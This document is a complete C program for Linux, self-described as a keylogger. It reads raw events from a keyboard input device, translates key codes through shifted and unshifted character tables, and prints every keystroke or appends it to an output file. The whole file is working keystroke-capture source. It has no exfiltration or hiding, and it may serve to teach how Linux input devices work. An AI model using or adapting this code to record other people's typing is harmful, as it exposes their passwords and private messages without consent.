#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <stdbool.h>

char keymap[128] = {
  [KEY_1] = '1',
  [KEY_2] = '2',
  [KEY_3] = '3',
  [KEY_4] = '4',
  [KEY_5] = '5',
  [KEY_6] = '6',
  [KEY_7] = '7',
  [KEY_8] = '8',
  [KEY_9] = '9', 
  [KEY_0] = '0',
  [KEY_A] = 'a',
  [KEY_B] = 'b',
  [KEY_C] = 'c',
  [KEY_D] = 'd',
  [KEY_E] = 'e',
  [KEY_F] = 'f',
  [KEY_G] = 'g',
  [KEY_H] = 'h',
  [KEY_I] = 'i',
  [KEY_J] = 'j',
  [KEY_K] = 'k',
  [KEY_L] = 'l',
  [KEY_M] = 'm',
  [KEY_N] = 'n',
  [KEY_O] = 'o',
  [KEY_P] = 'p',
  [KEY_Q] = 'q',
  [KEY_R] = 'r',
  [KEY_S] = 's',
  [KEY_T] = 't',
  [KEY_U] = 'u',
  [KEY_V] = 'v',
  [KEY_W] = 'w',
  [KEY_X] = 'x',
  [KEY_Y] = 'y',
  [KEY_Z] = 'z',
  [KEY_SPACE] = ' ',
  [KEY_TAB] = '\t',
  [KEY_ENTER] = '\n',
  [KEY_BACKSPACE] = '\b',
  [KEY_MINUS] = '-',
  [KEY_EQUAL] = '=',
  [KEY_LEFTBRACE] = '[',
  [KEY_RIGHTBRACE] = ']',
  [KEY_BACKSLASH] = '\\',
  [KEY_SEMICOLON] = ';',
  [KEY_APOSTROPHE] = '\'',
  [KEY_GRAVE] = '`',
  [KEY_COMMA] = ',',
  [KEY_DOT] = '.',
  [KEY_SLASH] = '/',
};

char shift_keymap[128] = {
  [KEY_1] = '!',
  [KEY_2] = '@',
  [KEY_3] = '#',
  [KEY_4] = '$',
  [KEY_5] = '%',
  [KEY_6] = '^',
  [KEY_7] = '&',
  [KEY_8] = '*',
  [KEY_9] = '(', 
  [KEY_0] = ')', 
  [KEY_A] = 'A',
  [KEY_B] = 'B',
  [KEY_C] = 'C',
  [KEY_D] = 'D',
  [KEY_E] = 'E',
  [KEY_F] = 'F',
  [KEY_G] = 'G',
  [KEY_H] = 'H',
  [KEY_I] = 'I',
  [KEY_J] = 'J',
  [KEY_K] = 'K',
  [KEY_L] = 'L',
  [KEY_M] = 'M',
  [KEY_N] = 'N',
  [KEY_O] = 'O',
  [KEY_P] = 'P',
  [KEY_Q] = 'Q',
  [KEY_R] = 'R',
  [KEY_S] = 'S',
  [KEY_T] = 'T',
  [KEY_U] = 'U',
  [KEY_V] = 'V',
  [KEY_W] = 'W',
  [KEY_X] = 'X',
  [KEY_Y] = 'Y',
  [KEY_Z] = 'Z',
  [KEY_MINUS] = '_',
  [KEY_EQUAL] = '+',
  [KEY_LEFTBRACE] = '{',
  [KEY_RIGHTBRACE] = '}',
  [KEY_BACKSLASH] = '|',
  [KEY_SEMICOLON] = ':',
  [KEY_APOSTROPHE] = '"',
  [KEY_GRAVE] = '~',
  [KEY_COMMA] = '<',
  [KEY_DOT] = '>',
  [KEY_SLASH] = '?',
  [KEY_SPACE] = ' ',
  [KEY_TAB] = '\t',
  [KEY_ENTER] = '\n',
  [KEY_BACKSPACE] = '\b',
};

struct input_event ev;

int main(int argc, char *argv[]) {
  int option, fd_input = -1, fd_output = -1; 
  char *input_filename = NULL, *output_filename = NULL;

  while ((option = getopt(argc, argv, "i:o:")) != - 1) {
    switch(option) {
      case 'i':
        input_filename = optarg;
        fd_input = open(input_filename, O_RDONLY);
        if (fd_input == -1) {
          perror("failed to open file\n");
          exit(EXIT_FAILURE);
        }
        break;
      case 'o':
        output_filename = optarg;
        fd_output = open(output_filename, O_WRONLY | O_APPEND);
        if (fd_output == -1) {
          perror("failed to write file\n");
          exit(EXIT_FAILURE);
        }
        break;
    }
  }

  if (input_filename == NULL) {
    fprintf(stderr, "Error: -i is required\n");
    fprintf(stderr , "Usage: %s -i <keyboard-event-file>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  printf("keylogger active\n");

  int shift = 0;
  while (true) {
    if (read(fd_input, &ev, sizeof(struct input_event)) != sizeof(struct input_event)) {
      perror("failed to read file\n");
      exit(EXIT_FAILURE);
    }
    if (ev.type != EV_KEY)
      continue;

    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
      shift = (ev.value != 0);
      continue;
    }

    if (ev.value == 1 || ev.value == 2) {
      char ch = shift ? shift_keymap[ev.code] : keymap[ev.code];

      if (!ch)
        continue;

      if (output_filename == NULL) {
        putchar(ch);
        fflush(stdout);
      }
      else
        write(fd_output, &ch, sizeof(ch));
    }
  }

  printf("\n");

  if (fd_output != -1)
    close(fd_output);
  
  close(fd_input);
  return 0;
};
